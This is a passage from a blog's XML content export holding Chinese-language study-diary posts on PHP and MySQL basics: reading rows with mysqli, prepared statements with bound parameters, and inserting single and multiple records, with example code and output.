request.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="type">System</span>.out.println(servletContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.catalina</span><span class="selector-class">.core</span><span class="selector-class">.ApplicationContextFacade</span>@<span class="keyword">672c0e6b</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/26-基础24</title>
    <url>/2020/07/26/PHP-2020-7-26-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="MySQL读取数据"><a href="#MySQL读取数据" class="headerlink" title="MySQL读取数据"></a>MySQL读取数据</h1><h2 id="从MySQL数据库读取数据"><a href="#从MySQL数据库读取数据" class="headerlink" title="从MySQL数据库读取数据"></a>从MySQL数据库读取数据</h2><p>使用SELECT语句用于从数据表中读取数据<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">column_name</span>(s) <span class="keyword">FROM</span> <span class="built_in">table_name</span></span><br></pre></td></tr></table></figure><br>可以用*来读取所有数据表中的字段<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="built_in">table_name</span></span><br></pre></td></tr></table></figure></p>
<h2 id="使用MySQLi"><a href="#使用MySQLi" class="headerlink" title="使用MySQLi"></a>使用MySQLi</h2><p>操作基本一致<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDB"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span></span><br><span class="line"><span class="php"><span class="comment">// Check connection</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . $conn-&gt;connect_error);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$sql = <span class="string">"SELECT id, firstname, lastname FROM MyGuests"</span>;</span></span><br><span class="line"><span class="php">$result = $conn-&gt;query($sql);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 输出数据</span></span></span><br><span class="line"><span class="php">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"id: "</span> . $row[<span class="string">"id"</span>]. <span class="string">" - Name: "</span> . $row[<span class="string">"firstname"</span>]. <span class="string">" "</span> . $row[<span class="string">"lastname"</span>]. <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"0 结果"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$conn-&gt;close();</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">id:</span> <span class="number">1</span> - <span class="string">Name:</span> John Doe</span><br><span class="line"><span class="string">id:</span> <span class="number">2</span> - <span class="string">Name:</span> John Doe</span><br><span class="line"><span class="string">id:</span> <span class="number">3</span> - <span class="string">Name:</span> Mary Moe</span><br><span class="line"><span class="string">id:</span> <span class="number">4</span> - <span class="string">Name:</span> Julie Dooley</span><br><span class="line"><span class="string">id:</span> <span class="number">5</span> - <span class="string">Name:</span> John Doe</span><br><span class="line"><span class="string">id:</span> <span class="number">6</span> - <span class="string">Name:</span> Mary Moe</span><br><span class="line"><span class="string">id:</span> <span class="number">7</span> - <span class="string">Name:</span> Julie Dooley</span><br></pre></td></tr></table></figure><br>首先，我们设置了 SQL 语句从 MyGuests数据表中读取 id, firstname 和 lastname 三个字段。之后我们使用该 SQL 语句从数据库中取出结果集并赋给复制给变量 $result。</p>
<p>函数 num_rows() 判断返回的数据。</p>
<p>如果返回的是多条数据，函数 fetch_assoc() 将结合集放入到关联数组并循环输出。 while() 循环出结果集，并输出 id, firstname 和 lastname 三个字段值。</p>
<p>面向过程<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"username"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"password"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDB"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = mysqli_connect($servername, $username, $password, $dbname);</span></span><br><span class="line"><span class="php"><span class="comment">// Check connection</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$conn) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . mysqli_connect_error());</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$sql = <span class="string">"SELECT id, firstname, lastname FROM MyGuests"</span>;</span></span><br><span class="line"><span class="php">$result = mysqli_query($conn, $sql);</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (mysqli_num_rows($result) &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 输出数据</span></span></span><br><span class="line"><span class="php">    <span class="keyword">while</span>($row = mysqli_fetch_assoc($result)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"id: "</span> . $row[<span class="string">"id"</span>]. <span class="string">" - Name: "</span> . $row[<span class="string">"firstname"</span>]. <span class="string">" "</span> . $row[<span class="string">"lastname"</span>]. <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"0 结果"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">mysqli_close($conn);</span></span><br></pre></td></tr></table></figure><br>运行结果一样</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li><p>函数 num_rows() 判断返回的数据</p>
</li>
<li><p>函数 fetch_assoc() 将结合集放入到关联数组并循环输出</p>
</li>
<li><p>在使用函数 fetch_assoc()时，定义一个变量，并采用键值对中值的方式去访问数据</p>
</li>
</ol>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/25-基础23</title>
    <url>/2020/07/25/PHP-2020-7-25-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="MySQL预处理语句"><a href="#MySQL预处理语句" class="headerlink" title="MySQL预处理语句"></a>MySQL预处理语句</h1><p>预处理语句对于防止MySQL注入是非常有用的</p>
<h2 id="预处理语句及绑定参数"><a href="#预处理语句及绑定参数" class="headerlink" title="预处理语句及绑定参数"></a>预处理语句及绑定参数</h2><p>预处理语句用于执行多个相同的SQL语句，并且执行效率更高</p>
<p>工作原理</p>
<ol>
<li>预处理：创建SQL语句模板并发送到数据库。预留的值使用参数”?”标记<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">INSERT INTO MyGuests (<span class="name">firstname</span>, lastname, email) VALUES(?, ?, ?)</span><br></pre></td></tr></table></figure></li>
<li><p>数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出</p>
</li>
<li><p>执行，最后将应用绑定的值传递给参数”?”，数据库执行语句。应用可以多次执行语句，如果参数的值不一样。相比于直接执行SQL语句，预处理语句有几个主要优点</p>
</li>
</ol>
<h2 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a>预处理语句</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"username"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"password"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDB"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 检测连接</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . $conn-&gt;connect_error);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 预处理及绑定</span></span></span><br><span class="line"><span class="php">$stmt = $conn-&gt;prepare(<span class="string">"INSERT INTO MyGuests (firstname, lastname, email) VALUES (?, ?, ?)"</span>);</span></span><br><span class="line"><span class="php">$stmt-&gt;bind_param(<span class="string">"sss"</span>, $firstname, $lastname, $email);</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 设置参数并执行</span></span></span><br><span class="line"><span class="php">$firstname = <span class="string">"John"</span>;</span></span><br><span class="line"><span class="php">$lastname = <span class="string">"Doe"</span>;</span></span><br><span class="line"><span class="php">$email = <span class="string">"john@example.com"</span>;</span></span><br><span class="line"><span class="php">$stmt-&gt;execute();</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$firstname = <span class="string">"Mary"</span>;</span></span><br><span class="line"><span class="php">$lastname = <span class="string">"Moe"</span>;</span></span><br><span class="line"><span class="php">$email = <span class="string">"mary@example.com"</span>;</span></span><br><span class="line"><span class="php">$stmt-&gt;execute();</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$firstname = <span class="string">"Julie"</span>;</span></span><br><span class="line"><span class="php">$lastname = <span class="string">"Dooley"</span>;</span></span><br><span class="line"><span class="php">$email = <span class="string">"julie@example.com"</span>;</span></span><br><span class="line"><span class="php">$stmt-&gt;execute();</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"新记录插入成功"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$stmt-&gt;close();</span></span><br><span class="line"><span class="php">$conn-&gt;close();</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">新记录插入成功</span><br></pre></td></tr></table></figure></p>
<p>可以看到之前的步骤没变过</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">INSERT INTO MyGuests (<span class="name">firstname</span>, lastname, email) VALUES(?, ?, ?)</span><br></pre></td></tr></table></figure>
<p>使用了问好，来作为标记参数，可以为整形，字符串，浮点数和布尔值</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span>-&gt;bind_param(<span class="string">"sss"</span>, <span class="variable">$firstname</span>, <span class="variable">$lastname</span>, <span class="variable">$email</span>);</span><br></pre></td></tr></table></figure>
<p>该函数绑定了参数，并使用sss告诉数据类型为字符串</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li><p>预处理语句大大降低了分析时间，只做了一次查询；</p>
</li>
<li><p>绑定参数减少了服务器宽带，只需要发送查询的参数，而不是整个语句；</p>
</li>
<li><p>预处理语句针对SQL注入非常有用，因为参数值发送后使用不同的协议，保证数据的合法性</p>
</li>
<li><p>通过告诉数据库参数的数据类型，可以降低 SQL 注入的风险</p>
</li>
<li><p>prepare()方法用于向数据库传预定义语句；bind_param()方法用于绑定预定义语句的参数</p>
</li>
</ol>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/24-基础22</title>
    <url>/2020/07/24/PHP-2020-7-24-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="MySQL-插入多条数据"><a href="#MySQL-插入多条数据" class="headerlink" title="MySQL 插入多条数据"></a>MySQL 插入多条数据</h1><p>PHP MySQL中可以使用<code>mysqli_multi_query()</code>函数来执行多条SQL语句</p>
<p>面向对象<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDB"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 创建链接</span></span></span><br><span class="line"><span class="php">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span></span><br><span class="line"><span class="php"><span class="comment">// 检查链接</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . $conn-&gt;connect_error);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line">$sql = "INSERT INTO MyGuests (firstname, lastname, email)</span><br><span class="line"><span class="php">VALUES (<span class="string">'John'</span>, <span class="string">'Doe'</span>, <span class="string">'john@example.com'</span>);<span class="string">";</span></span></span><br><span class="line">$sql .= "INSERT INTO MyGuests (firstname, lastname, email)</span><br><span class="line"><span class="php">VALUES (<span class="string">'Mary'</span>, <span class="string">'Moe'</span>, <span class="string">'mary@example.com'</span>);<span class="string">";</span></span></span><br><span class="line">$sql .= "INSERT INTO MyGuests (firstname, lastname, email)</span><br><span class="line"><span class="php">VALUES (<span class="string">'Julie'</span>, <span class="string">'Dooley'</span>, <span class="string">'julie@example.com'</span>)<span class="string">";</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($conn-&gt;multi_query($sql) === <span class="keyword">TRUE</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"新记录插入成功"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $sql . <span class="string">"&lt;br&gt;"</span> . $conn-&gt;error;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$conn-&gt;close();</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">新记录插入成功</span><br></pre></td></tr></table></figure><br><img src="/img/JavaWeb/7-24学习日记/1.jpg" alt="avatar"></p>
<p>面向过程<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDB"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 创建链接</span></span></span><br><span class="line"><span class="php">$conn = mysqli_connect($servername, $username, $password, $dbname);</span></span><br><span class="line"><span class="php"><span class="comment">// 检查链接</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$conn) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . mysqli_connect_error());</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line">$sql = "INSERT INTO MyGuests (firstname, lastname, email)</span><br><span class="line"><span class="php">VALUES (<span class="string">'John'</span>, <span class="string">'Doe'</span>, <span class="string">'john@example.com'</span>);<span class="string">";</span></span></span><br><span class="line">$sql .= "INSERT INTO MyGuests (firstname, lastname, email)</span><br><span class="line"><span class="php">VALUES (<span class="string">'Mary'</span>, <span class="string">'Moe'</span>, <span class="string">'mary@example.com'</span>);<span class="string">";</span></span></span><br><span class="line">$sql .= "INSERT INTO MyGuests (firstname, lastname, email)</span><br><span class="line"><span class="php">VALUES (<span class="string">'Julie'</span>, <span class="string">'Dooley'</span>, <span class="string">'julie@example.com'</span>)<span class="string">";</span></span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (mysqli_multi_query($conn, $sql)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"新记录插入成功"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $sql . <span class="string">"&lt;br&gt;"</span> . mysqli_error($conn);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">mysqli_close($conn);</span></span><br></pre></td></tr></table></figure></p>
<p>PDO<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDB"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="php">    $conn = <span class="keyword">new</span> PDO(<span class="string">"mysql:host=$servername;dbname=$dbname"</span>, $username, $password);</span></span><br><span class="line"><span class="php">    <span class="comment">// set the PDO error mode to exception</span></span></span><br><span class="line"><span class="php">    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">    <span class="comment">// 开始事务</span></span></span><br><span class="line"><span class="php">    $conn-&gt;beginTransaction();</span></span><br><span class="line"><span class="php">    <span class="comment">// SQL 语句</span></span></span><br><span class="line">    $conn-&gt;exec("INSERT INTO MyGuests (firstname, lastname, email) </span><br><span class="line"><span class="php">    VALUES (<span class="string">'John'</span>, <span class="string">'Doe'</span>, <span class="string">'john@example.com'</span>)<span class="string">");</span></span></span><br><span class="line">    $conn-&gt;exec("INSERT INTO MyGuests (firstname, lastname, email) </span><br><span class="line"><span class="php">    VALUES (<span class="string">'Mary'</span>, <span class="string">'Moe'</span>, <span class="string">'mary@example.com'</span>)<span class="string">");</span></span></span><br><span class="line">    $conn-&gt;exec("INSERT INTO MyGuests (firstname, lastname, email) </span><br><span class="line"><span class="php">    VALUES (<span class="string">'Julie'</span>, <span class="string">'Dooley'</span>, <span class="string">'julie@example.com'</span>)<span class="string">");</span></span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">    <span class="comment">// 提交事务</span></span></span><br><span class="line"><span class="php">    $conn-&gt;commit();</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"新记录插入成功"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">catch</span>(PDOException $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 如果执行失败回滚</span></span></span><br><span class="line"><span class="php">    $conn-&gt;rollback();</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $sql . <span class="string">"&lt;br&gt;"</span> . $e-&gt;getMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$conn = <span class="keyword">null</span>;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a>预处理语句</h2><p>mysql还提供了第二种方式用于插入语句</p>
<p>可以预处理语句和绑定参数</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDB"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span></span><br><span class="line"><span class="php"><span class="comment">// 检测连接</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . $conn-&gt;connect_error);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    $sql = <span class="string">"INSERT INTO MyGuests(firstname, lastname, email)  VALUES(?, ?, ?)"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 为 mysqli_stmt_prepare() 初始化 statement 对象</span></span></span><br><span class="line"><span class="php">    $stmt = mysqli_stmt_init($conn);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">//预处理语句</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (mysqli_stmt_prepare($stmt, $sql)) &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 绑定参数</span></span></span><br><span class="line"><span class="php">        mysqli_stmt_bind_param($stmt, <span class="string">'sss'</span>, $firstname, $lastname, $email);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="comment">// 设置参数并执行</span></span></span><br><span class="line"><span class="php">        $firstname = <span class="string">'John'</span>;</span></span><br><span class="line"><span class="php">        $lastname = <span class="string">'Doe'</span>;</span></span><br><span class="line"><span class="php">        $email = <span class="string">'john@example.com'</span>;</span></span><br><span class="line"><span class="php">        mysqli_stmt_execute($stmt);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $firstname = <span class="string">'Mary'</span>;</span></span><br><span class="line"><span class="php">        $lastname = <span class="string">'Moe'</span>;</span></span><br><span class="line"><span class="php">        $email = <span class="string">'mary@example.com'</span>;</span></span><br><span class="line"><span class="php">        mysqli_stmt_execute($stmt);</span></span><br><span class="line"></span><br><span class="line"><span class="php">        $firstname = <span class="string">'Julie'</span>;</span></span><br><span class="line"><span class="php">        $lastname = <span class="string">'Dooley'</span>;</span></span><br><span class="line"><span class="php">        $email = <span class="string">'julie@example.com'</span>;</span></span><br><span class="line"><span class="php">        mysqli_stmt_execute($stmt);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li>在使用<code>mysqli_multi_query()</code>时，每个SQL语句必须用分号隔开</li>
<li>在预处理之前，先使用<code>mysqli_stmt_init</code>来初始化statement对象</li>
<li><code>mysqli_stmt_prepare</code>用于绑定参数</li>
<li><code>mysqli_stmt_bind_param()</code>该函数绑定参数查询并将参数传递给数据库</li>
<li>第二个参数是 “sss”，s 字符告诉 mysql 参数是字符串；i是整数；d是双精度浮点数；b是布尔值</li>
<li><code>mysqli_stmt_execute</code>用于执行预定义语句</li>
</ol>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/23-基础21</title>
    <url>/2020/07/23/PHP-2020-7-23-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="MySQL插入数据"><a href="#MySQL插入数据" class="headerlink" title="MySQL插入数据"></a>MySQL插入数据</h1><p>使用INSERT INTO语句来向MySQL表添加新的记录<br><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">INSERT</span></span> INTO table_name (column1, column2, column3,...)</span><br><span class="line"><span class="function"><span class="title">VALUES</span></span> (value1, value2, value3,...)</span><br></pre></td></tr></table></figure></p>
<p>方法基本上和创建数据表一致<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDB"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span></span><br><span class="line"><span class="php"><span class="comment">// 检测连接</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . $conn-&gt;connect_error);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line">$sql = "INSERT INTO MyGuests (firstname, lastname, email)</span><br><span class="line"><span class="php">VALUES (<span class="string">'John'</span>, <span class="string">'Doe'</span>, <span class="string">'john@example.com'</span>)<span class="string">";</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($conn-&gt;query($sql) === <span class="keyword">TRUE</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"新记录插入成功"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $sql . <span class="string">"&lt;br&gt;"</span> . $conn-&gt;error;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$conn-&gt;close();</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">新记录插入成功</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/JavaWeb/7-24学习日记/0.png" alt="avatar"></p>
<p>面向过程<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDB"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = mysqli_connect($servername, $username, $password, $dbname);</span></span><br><span class="line"><span class="php"><span class="comment">// 检测连接</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$conn) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysqli_connect_error());</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line">$sql = "INSERT INTO MyGuests (firstname, lastname, email)</span><br><span class="line"><span class="php">VALUES (<span class="string">'John'</span>, <span class="string">'Doe'</span>, <span class="string">'john@example.com'</span>)<span class="string">";</span></span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (mysqli_query($conn, $sql)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"新记录插入成功"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $sql . <span class="string">"&lt;br&gt;"</span> . mysqli_error($conn);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span 